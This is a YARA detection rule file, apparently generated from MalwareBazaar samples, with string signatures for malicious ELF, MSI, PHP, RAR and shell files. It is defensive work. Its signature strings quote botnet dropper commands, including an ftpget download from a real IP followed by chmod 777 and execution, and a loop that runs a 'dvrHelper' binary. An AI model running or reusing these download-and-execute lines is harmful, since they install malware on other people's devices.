      $s4 = "> /$dir/0 && chmod 777 /$dir/0 && /$dir/0 && cd /$dir/" fullword ascii
      $s5 = "for arch in $arches" fullword ascii
      $s6 = "arches=\"mpsl arm7 mips arm arm5 x86 ppc sh4\"" fullword ascii
      $s7 = "chmod 777 dvrHelper" fullword ascii
      $s8 = "./dvrHelper jaws" fullword ascii
      $s9 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
      $s10 = "for dir in $dirs" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      all of them
}

rule d6e979a3574885e4bdb3b8c8831897302285fe2f5cf52a86ce4538705b803fac {
   meta:
      description = "evidences - file d6e979a3574885e4bdb3b8c8831897302285fe2f5cf52a86ce4538705b803fac.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "d6e979a3574885e4bdb3b8c8831897302285fe2f5cf52a86ce4538705b803fac"
   strings:
      $s1 = "AAHSHS.exe" fullword ascii
      $s2 = "L68F.Vpk" fullword ascii
      $s3 = "OgZ+ TH" fullword ascii
      $s4 = "3|%- ," fullword ascii
      $s5 = "YmGfnnNZC7" fullword ascii
      $s6 = "%di_%\\6" fullword ascii
      $s7 = "HejYW8~" fullword ascii
      $s8 = "j*ZZzJad_" fullword ascii
      $s9 = "RWMGR l" fullword ascii
      $s10 = "1QkCLg*Q`'T1" fullword ascii
      $s11 = "OTpnKi6\\" fullword ascii
      $s12 = "DgQth&([" fullword ascii
      $s13 = "iashw9!" fullword ascii
      $s14 = "hiFR>Yc" fullword ascii
      $s15 = "zhby&$R" fullword ascii
      $s16 = "yYFLIq](6" fullword ascii
      $s17 = "}ZlRk!Or" fullword ascii
      $s18 = "8hsLe?i9" fullword ascii
      $s19 = "PdNP\\g" fullword ascii
      $s20 = "kfPGhkR/" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

rule f6d1cacf51c76a5725c83a5dfc08763a8da8dc24d6dfa7dee1199f2f792fa465 {
   meta:
      description = "evidences - file f6d1cacf51c76a5725c83a5dfc08763a8da8dc24d6dfa7dee1199f2f792fa465.php"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "f6d1cacf51c76a5725c83a5dfc08763a8da8dc24d6dfa7dee1199f2f792fa465"
   strings:
      $s1 = "XLjEAD0fIYidXWvECHc0NLHldz67WDbiTLxDd5decMnZ2BtDLaSIctxDTIFVg7rnwa3JlZ52OdXb97N6jIV9eocY+JVO1JO8XUBb6A+CRezRZfDvP/n23YblUIAsaPjW" ascii
      $s2 = "6g7qrMT7vFuVLe/r3NWev5LwFi9ggF1KHIpr93loCrr+c06Zteph8UrxYyoYEf0mxini/CHgmQL9rjZcfj/8kMCmEuEvlfz6vltpOYRFo/TXQRWOEOH+NMqdfyFY7KO9" ascii
      $s3 = "b4S7LhBjrkBYXvhIfWbKA7ZQbFXXvnGLruQap4jXVIc3lguA+4H32mChU6IxNSIrCfBN8tdwpkaz30OcKRCJ4rwF5/USNDeI57pOamUAsKLr9vlcwEefE/USn1ugWjvH" ascii
      $s4 = "mvWiYSdKhXk6bE/M+orF81l9iuUKxOvldOpkfPeQ75/PLogKiFyqmxV+y8g40Txf0ahPGinxd2591CUOoThohJ0d3h9h9faX3G8jC8Tg0bU+xZRyjYFpj8AttkWHO1Th" ascii
      $s5 = "2Je1Jo4wK0rOU9SGkQlyWE7aes2T3dPanzAEzoK62K++h7MHGSac97zEyeJdFidMn54Y23hZ1hF1yKaocX/8lsfu18vCWFzJwnUs0A3ngrx6unUq+5ekWFYor7ub+J4p" ascii
      $s6 = "8Sc3pHlIRR5yBCtDJ3LhJRrtT8BXrPOvHfcE8fHlgCMK7yI36W8ogHmAYY8H54HwwbI1T3bnTZFLF7UxgNxp2+d2cBAVExDJ7jIsKdDH4uhT+bKf/Y7P3ctV2aBKV6Zy" ascii
      $s7 = "FObSvu6JAYAORSKVw8qvktsF+TwzzX8asUezhxaqtfGns6+O+JcIgVKp6YsXUXuuZZGLMvWDRs8NHRGxHXNUeDx3HxPrPFuk/3UKcKaw5XfSqmlc6cD1VYQOJAjWR0fT" ascii
      $s8 = "QPPSqlKcjj8T8AdqHEScGXHMebRSfPCHKGSpyxuvRRxjM4er5ezcRrm6JuTI9X3hfzFIDGE7RvEHaPHn4v99Tklh4VIhqM+fYa/uYqEpjz/5KFTsSdE58Ri55ez7I+WY" ascii
      $s9 = "blZvm2aGDVK8E7daqMwC5N/Qly23cHqopL5WET0Ys9c05jFoFphwhI99yPnMzVwi3xkQYFy8WtsE6tEuXJNuADsY8YFtp7FkxtcxYk911sPmvJXZOERXIDEju+8XG0Km" ascii
      $s10 = "yAlc00d0dJjJbR/sQpUOAiqiUn+hFtgg73TzgnsOQ+vkjc+T1Xfhbs4c2LqD23MpOiK2S3EE6wK60ttWuE4YrD9h9gyWy2oRNBxEtTsExUORSpyDWUU9Mn87INcD2Xb4" ascii
      $s11 = "R46V4tD2xgz9jO7VWjaT5m5/F/mR4kR+e1rWaYgGDJUwpGncvCDOgEtDy0uxFaxfnUFUPVWnA6UROLVyzNW7ckkNAE36xUfPFoeaKPQ4A4ErsgZpAMijVliss9FD7OBV" ascii
      $s12 = "kQQZSFBlZdaf7v2HTWjZwHfTZVwnsMk3P4mlrA6BNzMDnR+e5UXeylGtONg+irCSuIJHopqHwTIrQOD3TsPHK0L0SnEbrZLF/jRNcc+B9rChUunjU/jj9/lTCTrI0h3d" ascii
      $s13 = "Nvzc8UGGbMBC7kTAiWRR2Sy2P8HPQ+tShFzEiRCGmfaUcV+K1kDzLnEYpudb/ENlYl9mYV3aUjZPZa0JlMNwPXdDoYFvuWq2T2KVd8INm8uvP2P7RV/slUZC8+NQvQsv" ascii
      $s14 = "mvWiYSdKhXk6bE/M+orF81l9iuUKxOvldOpkfPeQ75/PLogKiFyqmxV+y8g40Txf0ahPGinxd2591CUOoThohJ0d3h9h9faX3G8jC8Tg0bU+xZRyjYFpj8AttkWHO1Th" ascii
      $s15 = "xxoyL0ItdteWPnNX6fcZLoADXWusHSJFxjZOjw1dMn/QvcVKra/2TenWQJZ8beyQOQYGnAdMpSejUHN6dODoC4892BS3TRbw2VE7jOqANvVeOFN1fuBqfwR5fEV6xLRR" ascii
      $s16 = "XJRMRQyvOsi78TW2xj68P0cKW2JFi8SYuYIkWkheHEUbbYMVoSNnf0/gC+o+zxjVg592oGGi3+X+6yemKW0AKyk4/vMrkB2s35pUpOhXu7iwvGg+P/fjJ41quy2NsXhC" ascii
      $s17 = "x8QpEOqs9gPnFBkFQRb86Ez1q4qWuVXwQfiZtGYBQlqpU9kFkj+2spHZfimUBue9g8VcpiaPwa+grNpp0CiUWCX6J0Gxwy+S808dDE9yvlHzFprz4QfdOnxRbWXOmtAa" ascii
      $s18 = "rAiLRv+IuimqmBkMAm4m9Ov5KUJo/xpdD79n/60wwtDjWl5m3xoa/CSwP559bo+q/bAgi7xcozZPfbb4d9mGVPCzS3Do98W8tTin365oY9uwutgDYQXvtaygspYpf/kO" ascii
      $s19 = "z+6eKqY5fkcUKyrYEaA/Ar9lei5Jmrc7Jcq1yMJ8k3+tnthKXx4AgbBr5Vwr8Wa9gBG7osuJK+dobmmhpBoQCiay08yKiy82pumAMYkL9028hFEUhdzgYdgkmCq/dapn" ascii
      $s20 = "skPB/o1Y9Ol+8gZQjZqbrNBuYvjFsmO07PUc3cctS6DnYqLQHHLfSFCtqGKXRGy5mAl3+NhZ6IOIP3lufoz0j0RzxAhU7vRDkV8ufWkDFAs+AoeEF03hjNPLu4U64PDV" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule f9f67c4e2b4cd32f3b3c055647d26d4490be818f76a9ebcd5d0388618811a744 {
   meta:
      description = "evidences - file f9f67c4e2b4cd32f3b3c055647d26d4490be818f76a9ebcd5d0388618811a744.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "f9f67c4e2b4cd32f3b3c055647d26d4490be818f76a9ebcd5d0388618811a744"
   strings:
      $s1 = "cd /tmp; ftpget 103.188.82.218 -p 21 mips mips; chmod 777 mips; ./mips tlr" fullword ascii
      $s2 = "cd /tmp; ftpget 103.188.82.218 -p 21 mpsl mpsl; chmod 777 mpsl; ./mpsl tlr" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

/* Super Rules ------------------------------------------------------------- */

rule _2328542fbda43d45a53e5cf3a5df03699609f591590012fc4240a1be00d608a9_a70cc08523e57daeb3beb725eef1e9d3eff6bc5e926b2f327295737055_0 {
   meta:
      description = "evidences - from files 2328542fbda43d45a53e5cf3a5df03699609f591590012fc4240a1be00d608a9.msi, a70cc08523e57daeb3beb725eef1e9d3eff6bc5e926b2f327295737055b7541e.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "2328542fbda43d45a53e5cf3a5df03699609f591590012fc4240a1be00d608a9"
      hash2 = "a70cc08523e57daeb3beb725eef1e9d3eff6bc5e926b2f327295737055b7541e"
   strings:
      $x1 = "oned files.LanguageList of decimal language Ids, comma-separated if more than one.Integer containing bit flags representing file" ascii
      $x2 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x3 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s4 = "ReachFramework.resources.dll" fullword wide
      $s5 = "Update.dll" fullword ascii
      $s6 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s7 = "get_loader_name_from_dll" fullword ascii
      $s8 = "4C4}INSTALLFOLDERl4dPleasePleasePleaseProgramFilesFoldergujfn150|Windows NTTARGETDIR.SourceDirSetupfile.datValidateProductIDProc" ascii
      $s9 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s10 = "ack cabinet order.InstallExecuteSequenceInstallUISequenceMediaDiskIdPrimary key, integer to determine sort order for table.LastS" ascii
      $s11 = "process_config_directive" fullword ascii
      $s12 = "qgethostname" fullword ascii
      $s13 = "get_loader_name" fullword ascii
      $s14 = "alizeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProduct_{125CBCBA-000D-4311-82CD-4ABABCD73" ascii
      $s15 = "dActionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress acti" ascii
      $s16 = "ode.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type that exten" ascii
      $s17 = ", Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;L" ascii
      $s18 = "ags.SourceCustomSourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of " ascii
      $s19 = "ature attributesFeatureComponentsFeature_Foreign key into Feature table.Component_Foreign key into Component table.FilePrimary k" ascii
      $s20 = "qregexec" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 27000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _115ad66a444732ea0982c1d5acb334cb4acd706ae195ca7218af2d1d48358ad3_22b8bb65ff649d6a33b4ef9e216c0f7560b52014d6ae5a3817880e1bd6_1 {
   meta:
      description = "evidences - from files 115ad66a444732ea0982c1d5acb334cb4acd706ae195ca7218af2d1d48358ad3.elf, 22b8bb65ff649d6a33b4ef9e216c0f7560b52014d6ae5a3817880e1bd6a12bfa.elf, 947d94994555662758c6ad57ec25672e40ce688e135e9b81090d1d58b34392b2.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "115ad66a444732ea0982c1d5acb334cb4acd706ae195ca7218af2d1d48358ad3"
      hash2 = "22b8bb65ff649d6a33b4ef9e216c0f7560b52014d6ae5a3817880e1bd6a12bfa"
      hash3 = "947d94994555662758c6ad57ec25672e40ce688e135e9b81090d1d58b34392b2"
   strings:
      $s1 = "?33333333" fullword ascii /* reversed goodware string '33333333?' */ /* hex encoded string '3333' */
      $s2 = "(old_top == (((mbinptr) (((char *) &((av)->bins[((1) - 1) * 2])) - __builtin_offsetof (struct malloc_chunk, fd)))) && old_size =" ascii
      $s3 = "relocation processing: %s%s" fullword ascii
      $s4 = "!victim || ((((mchunkptr)((char*)(victim) - 2*(sizeof(size_t)))))->size & 0x2) || ar_ptr == (((((mchunkptr)((char*)(victim) - 2*" ascii
      $s5 = "%s%s%s:%u: %s%sAssertion `%s' failed." fullword ascii
      $s6 = "ELF load command address/offset not properly aligned" fullword ascii
      $s7 = "((struct pthread *)__builtin_thread_pointer () - 1)->tid == ppid" fullword ascii
      $s8 = "invalid target namespace in dlmopen()" fullword ascii
      $s9 = "DYNAMIC LINKER BUG!!!" fullword ascii
      $s10 = "symbol=%s;  lookup in file=%s [%lu]" fullword ascii
      $s11 = "%s: Symbol `%s' has different size in shared object, consider re-linking" fullword ascii
      $s12 = "%s: error: %s: %s (%s)" fullword ascii
      $s13 = "(bitmask_nwords & (bitmask_nwords - 1)) == 0" fullword ascii
      $s14 = "ns == 0 || i == nloaded || i == nloaded - 1" fullword ascii
      $s15 = "int_no <= (uintmax_t) (exponent < 0 ? ((9223372036854775807LL) - bits + 1) / 4 : ((9223372036854775807LL) - exponent - bits + 1)" ascii
      $s16 = "inptr - bytebuf > (state->__count & 7)" fullword ascii
      $s17 = "int_no <= (uintmax_t) (exponent < 0 ? ((9223372036854775807LL) - bits + 1) / 4 : ((9223372036854775807LL) - exponent - bits + 1)" ascii
      $s18 = "inend - inptr > (state->__count & ~7)" fullword ascii
      $s19 = "!newp || ((((mchunkptr)((char*)(newp) - 2*(sizeof(size_t)))))->size & 0x2) || ar_ptr == (((((mchunkptr)((char*)(newp) - 2*(sizeo" ascii
      $s20 = "*** %n in writable segment detected ***" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 14000KB and ( 8 of them )
      ) or ( all of them )
}

rule _73dbf183a65717383cab09dba769006dd554c053ea30a121ac5bcac71c811c2d_8bfd71d3d4e2ee87b40c52ebbecc6e35230639890ee776a7c9d035e8f0_2 {
   meta:
      description = "evidences - from files 73dbf183a65717383cab09dba769006dd554c053ea30a121ac5bcac71c811c2d.unknown, 8bfd71d3d4e2ee87b40c52ebbecc6e35230639890ee776a7c9d035e8f0960c0c.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "73dbf183a65717383cab09dba769006dd554c053ea30a121ac5bcac71c811c2d"
      hash2 = "8bfd71d3d4e2ee87b40c52ebbecc6e35230639890ee776a7c9d035e8f0960c0c"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */
      $s2 = "AAAAAAAAAEAAAAA" ascii /* base64 encoded string '       @   ' */
      $s3 = "AEAAAAAAAAA" ascii /* base64 encoded string ' @      ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                            ' */
      $s5 = "BAAAAAAAAAAAA" ascii /* base64 encoded string '         ' */
      $s6 = "AAAAAFAAAA" ascii /* base64 encoded string '    P  ' */
      $s7 = "AQjN05WSVVGdpJ3VAMjdAMzXf9mP8AgM2BgMlRXYjlmZpRnclNUOwUDWAITYAIzM05WSwF2dTBgMzQnbJ9GVAIzM05WSkFWZSBgMzQnbJV1bUBgMzIXZzVHAyMjbpdlL" ascii
      $s8 = "f50TJRVVDVEWFBARJRXYtJ3bG9FdldGAEl0av9GafBARJdFSAQUSP9GVl1WYOBXYNBARFJVSVFVRS9VWBxEUTlERfNVRAQURSlUVRVkUf1URUNVWT91UFBwQHBgQ4UzQ" ascii
      $s9 = "BAAAAAAAAAAAAAAAAAAA8AAA" ascii /* base64 encoded string '              <  ' */
      $s10 = "6AAAAAAAAA" ascii /* reversed goodware string 'AAAAAAAAA6' */
      $s11 = "v5mbhNGItFmcn9mcwBycphGVh0MTBgbINnAtA4guf4AAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAgLAA8//AAAAEAAAAMAAQqVT" ascii
      $s12 = "0AAAAAAAAAEBA" ascii /* base64 encoded string '       @@' */
      $s13 = "RYwAwEhBDUiEYEAIFwRMSgBGIUiEFAiCYgBCYMAIGgBHBIAIFkQCJIAAFURAYkACpIRBdkQCIcAAMkAGBAABF0hABAQBIYQAAQQCQgRCCAgBYAAAD4AGBAABYgBCYgBB" ascii
      $s14 = "IgQBdEwAgcQQBGBCCIAIHIAEcEgAAYQBdgQOBKRBdIAHGcADcEQAgQQNBKRABAiBIgQBdgwAgcACF0BCCAgBlIBCBASBIggAHQQGSIQAgUgDtEYEBAgBcEjEIgQBdUiE" ascii
      $s15 = "FAyCIgAHlEoEBQAIJIQHBGRGBKhDBQAILURgSAAIFERgSIQcSEwAgkgANIRACAiBIgACCASBFEYEO0hDdIAIJEQgSEQAgYACZDoEBIAIH4Q2AKRHBAwBIgQAgQwAd4QH" ascii
      $s16 = "qQAAAMUfDIgCAAwGoIABAAAR9VhAWpCBAAgQAqAABUxcuoiBAAQfooAABQBKCIjKcK9YeIgFlwp0CcRJBAAAI1IGOpCnSPGGfIgFlwp0jBxHCcRJcK9YeIAGlwp0CkRJ" ascii
      $s17 = "+/2FHoAAA0/bAAAAACyBKAAA8/GAAEAAgcwCKAAA7PnCKAAAQN3A6pAAAk/cwBQQ1JHAAAwC6MQEAAwHAAQAQBQBwsBAAAAANEQBuDwFAIAAAAAANAw6FDgJAIAAAAAA" ascii
      $s18 = "V9UVOlEVO90QfNVRAM1TEJEAT1ESE9GVl1Wa0BXdAIVY0FGZwBXQAAFWzlEAPlkLtVGdzl3UA8kROlEVVBlTJR1UBxEAOd1TElVRL9VTXBAThRXYkBHcBBATMRkUB9kQ" ascii
      $s19 = "F0RBdMAIIUngREngSEnEBMAILEngSAAIF0mgREQAgYQaCGRABAiBF0RBd0lgSklgSUlgSkTgSYwBSgQBdEAIFgQBd4QADAyBJJoEBcQBc0BHcIAIGkjgS0BAgYQCCKRH" ascii
      $s20 = "AAgLvZAAAYAKKAAAt82BEEhBAAgBoQwEBAAA2MaCIAAAAkDONYBDKAAAsgiBAAAASljBAAAHoYwCKAAAVgimKAAAr8WaOqAAAkybdyyHWUSAAAQPNeBBAAQA+pAAAoyc" ascii
   condition:
      ( uint16(0) == 0x4141 and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _37fabfdbe721b17601f7efa9059bf2c2cf71bb0689c1d5e6a4672fedd6f1e227_3d0ecb3153b2807c930f820ddf5406d2e040a1a3553abc7dadcd7b7a60_3 {
   meta:
      description = "evidences - from files 37fabfdbe721b17601f7efa9059bf2c2cf71bb0689c1d5e6a4672fedd6f1e227.rar, 3d0ecb3153b2807c930f820ddf5406d2e040a1a3553abc7dadcd7b7a608ee551.rar, 72312625fba0c0237c06eb131c554376df142b4ef0bb514f47e1655b6064948d.r00, a462535dd4c7d80f9b474eb2a67117563a9fcc8d73fc0592b7753fdf4191f758.rar, ac9668e3d4b15124dca0754cbcb471f3fe21ec7c86bbe7b004e155cf175c6400.r00, b9b8fac8f063817cc343683f71e60414dc961f1c1d2b4b421772b6fd373b082d.rar, dc758276ceeacab79a2a2959453c15c5ed7567186cd09a2958204efa2d371de4.r00"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "37fabfdbe721b17601f7efa9059bf2c2cf71bb0689c1d5e6a4672fedd6f1e227"
      hash2 = "3d0ecb3153b2807c930f820ddf5406d2e040a1a3553abc7dadcd7b7a608ee551"
      hash3 = "72312625fba0c0237c06eb131c554376df142b4ef0bb514f47e1655b6064948d"
      hash4 = "a462535dd4c7d80f9b474eb2a67117563a9fcc8d73fc0592b7753fdf4191f758"
      hash5 = "ac9668e3d4b15124dca0754cbcb471f3fe21ec7c86bbe7b004e155cf175c6400"
      hash6 = "b9b8fac8f063817cc343683f71e60414dc961f1c1d2b4b421772b6fd373b082d"
      hash7 = "dc758276ceeacab79a2a2959453c15c5ed7567186cd09a2958204efa2d371de4"
   strings:
      $s1 = "olbtbcr" fullword ascii
      $s2 = "g.B7!." fullword ascii
      $s3 = "/!4+ u17" fullword ascii
      $s4 = "OWPvUT2$VPw" fullword ascii
      $s5 = "rOnKoc)C" fullword ascii
      $s6 = "H3\\nalH/3P" fullword ascii
      $s7 = "fDLhX(*Q" fullword ascii
      $s8 = "Yjeg.$l/" fullword ascii
      $s9 = "pCpU\"$" fullword ascii
      $s10 = "MGXZ^WP_6" fullword ascii
      $s11 = "LItXFS\"" fullword ascii
      $s12 = "OGJeC\\" fullword ascii
      $s13 = "EKmSC*t" fullword ascii
      $s14 = "NsXe`l9" fullword ascii
      $s15 = "CdBn\"q5" fullword ascii
      $s16 = "AXsA#+j" fullword ascii
      $s17 = "}7VhCGsDDg" fullword ascii
      $s18 = "OrYr-42c" fullword ascii
      $s19 = "XpvUT2#g" fullword ascii
      $s20 = "jpfQX&q" fullword ascii
   condition:
      ( uint16(0) == 0x6152 and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _115ad66a444732ea0982c1d5acb334cb4acd706ae195ca7218af2d1d48358ad3_49da580656e51214d59702a1d983eff143af3560a344f524fe86326c53_4 {
   meta:
      description = "evidences - from files 115ad66a444732ea0982c1d5acb334cb4acd706ae195ca7218af2d1d48358ad3.elf, 49da580656e51214d59702a1d983eff143af3560a344f524fe86326c53fb5ddb.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "115ad66a444732ea0982c1d5acb334cb4acd706ae195ca7218af2d1d48358ad3"
      hash2 = "49da580656e51214d59702a1d983eff143af3560a344f524fe86326c53fb5ddb"
   strings:
      $s1 = "bad selector" fullword ascii
      $s2 = " volatile" fullword ascii
      $s3 = " restrict" fullword ascii
      $s4 = "resume" fullword ascii /* Goodware String - occured 57 times */
      $s5 = "serial" fullword ascii /* Goodware String - occured 168 times */
      $s6 = "DELETE" fullword ascii /* Goodware String - occured 355 times */
      $s7 = "default" fullword ascii /* Goodware String - occured 709 times */
      $s8 = "target" fullword ascii /* Goodware String - occured 880 times */
      $s9 = "while %s" fullword ascii
      $s10 = "opencl" fullword ascii /* Goodware String - occured 1 times */
      $s11 = " __vector(" fullword ascii
      $s12 = "OpenCL C" fullword ascii
      $s13 = " transaction_safe" fullword ascii
      $s14 = " const" fullword ascii
      $s15 = "coproc" fullword ascii /* Goodware String - occured 2 times */
      $s16 = " [clone " fullword ascii
      $s17 = "invalid label" fullword ascii /* Goodware String - occured 4 times */
      $s18 = "annotate" fullword ascii /* Goodware String - occured 4 times */
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _115ad66a444732ea0982c1d5acb334cb4acd706ae195ca7218af2d1d48358ad3_22b8bb65ff649d6a33b4ef9e216c0f7560b52014d6ae5a3817880e1bd6_5 {
   meta:
      description = "evidences - from files 115ad66a444732ea0982c1d5acb334cb4acd706ae195ca7218af2d1d48358ad3.elf, 22b8bb65ff649d6a33b4ef9e216c0f7560b52014d6ae5a3817880e1bd6a12bfa.elf, 87cdb7008b20cb3100cd180108607a31a644a4eadf4184c91054f4df1e6d61d8.elf, 947d94994555662758c6ad57ec25672e40ce688e135e9b81090d1d58b34392b2.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "115ad66a444732ea0982c1d5acb334cb4acd706ae195ca7218af2d1d48358ad3"
      hash2 = "22b8bb65ff649d6a33b4ef9e216c0f7560b52014d6ae5a3817880e1bd6a12bfa"
      hash3 = "87cdb7008b20cb3100cd180108607a31a644a4eadf4184c91054f4df1e6d61d8"
      hash4 = "947d94994555662758c6ad57ec25672e40ce688e135e9b81090d1d58b34392b2"
   strings:
      $s1 = "Remote I/O error" fullword ascii
      $s2 = "Protocol error" fullword ascii /* Goodware String - occured 26 times */
      $s3 = "Protocol not supported" fullword ascii /* Goodware String - occured 73 times */
      $s4 = "Connection refused" fullword ascii /* Goodware String - occured 127 times */
      $s5 = "Broken pipe" fullword ascii /* Goodware String - occured 742 times */
      $s6 = "Permission denied" fullword ascii /* Goodware String - occured 823 times */
      $s7 = "Not a XENIX named type file" fullword ascii
      $s8 = "Structure needs cleaning" fullword ascii
      $s9 = "/proc/" fullword ascii /* Goodware String - occured 1 times */
      $s10 = "Unknown error " fullword ascii /* Goodware String - occured 1 times */
      $s11 = "Is a named type file" fullword ascii
      $s12 = "No XENIX semaphores available" fullword ascii
      $s13 = "Wrong medium type" fullword ascii
      $s14 = "Streams pipe error" fullword ascii /* Goodware String - occured 2 times */
      $s15 = "Interrupted system call should be restarted" fullword ascii
      $s16 = "File descriptor in bad state" fullword ascii /* Goodware String - occured 3 times */
      $s17 = "Attempting to link in too many shared libraries" fullword ascii /* Goodware String - occured 3 times */
      $s18 = "RFS specific error" fullword ascii /* Goodware String - occured 3 times */
      $s19 = "Can not access a needed shared library" fullword ascii /* Goodware String - occured 3 times */
      $s20 = "Bad font file format" fullword ascii /* Goodware String - occured 3 times */
   condition:
      ( uint16(0) == 0x457f and filesize < 14000KB and ( 8 of them )
      ) or ( all of them )
}

rule _115ad66a444732ea0982c1d5acb334cb4acd706ae195ca7218af2d1d48358ad3_22b8bb65ff649d6a33b4ef9e216c0f7560b52014d6ae5a3817880e1bd6_6 {
   meta:
      description = "evidences - from files 115ad66a444732ea0982c1d5acb334cb4acd706ae195ca7218af2d1d48358ad3.elf, 22b8bb65ff649d6a33b4ef9e216c0f7560b52014d6ae5a3817880e1bd6a12bfa.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "115ad66a444732ea0982c1d5acb334cb4acd706ae195ca7218af2d1d48358ad3"
      hash2 = "22b8bb65ff649d6a33b4ef9e216c0f7560b52014d6ae5a3817880e1bd6a12bfa"
   strings:
      $s1 = "*** Error in `%s': %s: 0x%s ***" fullword ascii
      $s2 = "dig_no > int_no && exponent <= 0 && exponent >= (-37) - (6 + 1)" fullword ascii
      $s3 = "dig_no > int_no && exponent <= 0 && exponent >= (-307) - (15 + 1)" fullword ascii
      $s4 = "*** %s ***: %s terminated" fullword ascii
      $s5 = "inend - inptr <= sizeof (state->__value)" fullword ascii
      $s6 = "*nsize < ((((1 + ((53 - (-1021) + 2) * 10) / 3) + ((32) - 1)) / (32)) + 2)" fullword ascii
      $s7 = "*nsize < ((((1 + ((24 - (-125) + 2) * 10) / 3) + ((32) - 1)) / (32)) + 2)" fullword ascii
      $s8 = "unexpected reloc type in static binary" fullword ascii
      $s9 = "malloc_check_get_size: memory corruption" fullword ascii
      $s10 = "get-dynamic-info.h" fullword ascii
      $s11 = "__getpagesize" fullword ascii
      $s12 = "gshadow" fullword ascii
      $s13 = "sysmalloc" fullword ascii
      $s14 = "int_no == 0 && *startp != '0'" fullword ascii
      $s15 = "/sys/devices/system/cpu/online" fullword ascii
      $s16 = "int_no > 0 && exponent == 0" fullword ascii
      $s17 = "object=%s [%lu]" fullword ascii
      $s18 = "add %s [%lu] to global scope" fullword ascii
      $s19 = "/proc/sys/vm/overcommit_memory" fullword ascii
      $s20 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 14000KB and ( 8 of them )
      ) or ( all of them )
}

rule _115ad66a444732ea0982c1d5acb334cb4acd706ae195ca7218af2d1d48358ad3_947d94994555662758c6ad57ec25672e40ce688e135e9b81090d1d58b3_7 {
   meta:
      description = "evidences - from files 115ad66a444732ea0982c1d5acb334cb4acd706ae195ca7218af2d1d48358ad3.elf, 947d94994555662758c6ad57ec25672e40ce688e135e9b81090d1d58b34392b2.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "115ad66a444732ea0982c1d5acb334cb4acd706ae195ca7218af2d1d48358ad3"
      hash2 = "947d94994555662758c6ad57ec25672e40ce688e135e9b81090d1d58b34392b2"
   strings:
      $s1 = "%s: line %d: bad command `%s'" fullword ascii
      $s2 = "size_t)(const void *)((&zone_names[info->idx]) + 1) - (size_t)(const void *)(&zone_names[info->idx]) == 1) || __s1_len >= 4) && " ascii
      $s3 = "_t)(const void *)((&zone_names[info->idx]) + 1) - (size_t)(const void *)(&zone_names[info->idx]) == 1) && (__s1_len = __builtin_" ascii
      $s4 = "gethostbyaddr_r" fullword ascii
      $s5 = "gethostbyname_r" fullword ascii
      $s6 = "spoofalert" fullword ascii
      $s7 = "name[tp->tm_isdst]) + 1) - (size_t)(const void *)(__tzname[tp->tm_isdst]) == 1) ? __builtin_strcmp (&zone_names[info->idx], __tz" ascii
